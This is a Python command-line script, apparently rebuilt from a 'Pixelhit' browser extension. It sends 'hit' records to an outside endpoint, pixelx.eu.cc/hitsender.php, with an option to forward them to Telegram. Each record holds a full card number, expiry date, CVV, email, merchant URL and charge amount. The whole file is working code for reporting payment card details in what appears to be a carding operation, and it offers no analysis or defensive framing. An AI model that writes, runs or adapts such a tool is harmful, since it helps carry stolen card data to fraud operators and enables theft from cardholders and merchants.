"""
Pixelhit Extension - Hit Sender API Client

Sends requests to the hitsender.php endpoint, replicating the extension's
sendTelegramNotification() function from background.js (line 3181).

Endpoint: POST https://pixelx.eu.cc/hitsender.php
Auth: Bearer token (pixel_token from extension storage)
Content-Type: application/json
"""

import requests
import json
import sys
from dataclasses import dataclass, field, asdict
from typing import Optional


HIT_FORWARD_URL = "https://pixelx.eu.cc/hitsender.php"


@dataclass
class HitPayload:
    """Payload sent to hitsender.php.

    Fields match the JSON body in background.js sendTelegramNotification().
    The extension parses cardNumber as "card|mm|yy|cvv" (pipe-delimited)
    or accepts them individually.
    """
    chat_id: str              # Telegram user ID (pixel_user_id)
    userName: str             # Telegram display name
    card: str                 # Card number (first part of pipe-delimited string)
    mm: str                   # Expiry month
    yy: str                   # Expiry year
    cvv: str                  # CVV/CVC
    email: str = "N/A"        # Email used during checkout
    attempt: str = "1"        # Attempt number (skipped if 0 or "N/A")
    currency: str = "usd"     # Currency code
    amount: str = "0"         # Charge amount
    businessUrl: str = "N/A"  # Merchant/checkout URL
    successUrl: str = "N/A"   # Redirect URL after payment
    timeTaken: str = "N/A"    # Time taken for the hit
    tgForwardEnabled: bool = True  # Whether to forward to Telegram
    ver: str = "v1lt2"        # Version identifier


def send_hit(token: str, payload: HitPayload) -> requests.Response:
    """Send a hit notification to the hitsender API.

    Args:
        token: Bearer token (pixel_token from extension auth).
        payload: HitPayload with card and transaction details.

    Returns:
        requests.Response object.
    """
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}",
    }

    body = asdict(payload)
    # Ensure attempt is a string (extension does String(attempt))
    body["attempt"] = str(body["attempt"])

    response = requests.post(HIT_FORWARD_URL, headers=headers, json=body)
    return response


def parse_card_string(card_string: str) -> dict:
    """Parse a pipe-delimited card string into components.

    The extension uses format: "cardNumber|MM|YY|CVV"
    Example: "4111111111111111|12|25|123"
    """
    parts = card_string.split("|") if "|" in card_string else [card_string, "??", "??", "???"]
    return {
        "card": parts[0] if len(parts) > 0 else "N/A",
        "mm": parts[1] if len(parts) > 1 else "??",
        "yy": parts[2] if len(parts) > 2 else "??",
        "cvv": parts[3] if len(parts) > 3 else "???",
    }


def main():
    """CLI interface for sending hit requests."""
    if len(sys.argv) < 2:
        print("Usage: python hitsender.py <token>")
        print()
        print("Environment/arguments:")
        print("  token          - Bearer token from Pixelhit auth (pixel_token)")
        print()
        print("The script will prompt for the remaining fields interactively.")
        print()
        print("Example:")
        print('  python hitsender.py "your_pixel_token_here"')
        sys.exit(1)

    token = sys.argv[1]

    print("=== Pixelhit Hit Sender ===")
    print(f"Endpoint: {HIT_FORWARD_URL}")
    print()

    chat_id = input("Telegram chat_id (pixel_user_id): ").strip()
    user_name = input("userName (display name): ").strip() or "User"

    card_input = input("Card (pipe-delimited: number|MM|YY|CVV): ").strip()
    card_parts = parse_card_string(card_input)

    email = input("Email [N/A]: ").strip() or "N/A"
    attempt = input("Attempt number [1]: ").strip() or "1"
    currency = input("Currency [usd]: ").strip() or "usd"
    amount = input("Amount [0]: ").strip() or "0"
    business_url = input("Business URL [N/A]: ").strip() or "N/A"
    success_url = input("Success URL [N/A]: ").strip() or "N/A"
    time_taken = input("Time taken [N/A]: ").strip() or "N/A"
    tg_forward = input("Forward to Telegram? [Y/n]: ").strip().lower() != "n"

    payload = HitPayload(
        chat_id=chat_id,
        userName=user_name,
        card=card_parts["card"],
        mm=card_parts["mm"],
        yy=card_parts["yy"],
        cvv=card_parts["cvv"],
        email=email,
        attempt=attempt,
        currency=currency,
        amount=amount,
        businessUrl=business_url,
        successUrl=success_url,
        timeTaken=time_taken,
        tgForwardEnabled=tg_forward,
    )

    print()
    print("Sending payload:")
    print(json.dumps(asdict(payload), indent=2))
    print()

    try:
        resp = send_hit(token, payload)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text}")
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
